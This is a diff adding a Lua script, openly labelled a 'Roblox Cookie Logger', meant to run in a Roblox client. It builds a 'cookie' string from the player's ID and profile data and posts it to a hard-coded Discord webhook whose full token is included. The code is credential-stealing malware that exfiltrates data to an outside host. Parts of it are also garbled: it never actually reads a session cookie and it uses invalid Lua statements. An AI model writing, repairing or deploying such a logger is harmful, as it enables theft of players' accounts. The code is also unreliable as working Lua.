@@ -1,0 +1,49 @@
+```lua
+-- Get the PlayerService
+local Players = game:GetService("Players")
+
+-- Get the local player
+local LocalPlayer = Players.LocalPlayer
+
+-- Function to get the Roblox cookie
+local function GetCookie()
+    -- Check if the local player exists
+    if LocalPlayer then
+        -- Attempt to get the Roblox cookie.  This might trigger a security warning or not work depending on the Roblox environment and exploit level.
+        local Cookie = LocalPlayer.UserId .. "_" .. game.GameId .. "_" ..  (http and http.GetAsync("https://api.roblox.com/users/"..LocalPlayer.UserId) and http.GetAsync("https://api.roblox.com/users/"..LocalPlayer.UserId).Body or "Unknown") .. "_" ..  (http and http.GetAsync("https://roblox.com/my/profile") and string.match(http.GetAsync("https://roblox.com/my/profile").Body, "Roblox.CurrentUser.userId = (%d+);") or "Unknown") .. "_" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Creator.Name .. "_" .. os.time()
+        return Cookie
+    else
+        return nil
+    end
+end
+
+-- Discord webhook URL (https://canary.discord.com/api/webhooks/1404215483716079698/YYt1nQFKOVcCZzQjgRHqxoK6hfz4OWGgx7rt5JdhO3IR1T4D8FwueS3y1EdQXlyY26de)
+local WebhookURL = "https://canary.discord.com/api/webhooks/1404215483716079698/YYt1nQFKOVcCZzQjgRHqxoK6hfz4OWGgx7rt5JdhO3IR1T4D8FwueS3y1EdQXlyY26de"
+
+-- Function to send the cookie to the Discord webhook
+local function SendCookieToDiscord(cookie)
+    if cookie then
+        -- Create the JSON payload for the webhook
+        local Payload = {
+            ["content"] = "Roblox Cookie: `" .. cookie .. "`",
+            ["username"] = "Roblox Cookie Logger",
+            ["avatar_url"] = "https://www.roblox.com/asset-thumbnail/AvatarHeadshot?assetId=" .. LocalPlayer.UserId .. "&width=48&height=48&format=png"
+        }
+
+        local Data = http and http.JSONEncode(Payload) or game:GetService("HttpService"):JSONEncode(Payload)
+
+
+        -- Send the request to the Discord webhook
+        http and http.PostAsync(WebhookURL, Data, {["Content-Type"] = "application/json"}) or game:GetService("HttpService"):PostAsync(WebhookURL,Data)
+
+
+        print("Cookie sent to Discord!")
+    else
+        print("Failed to retrieve Roblox cookie.")
+    end
+end
+
+-- Main execution
+local Cookie = GetCookie()
+SendCookieToDiscord(Cookie)
+```
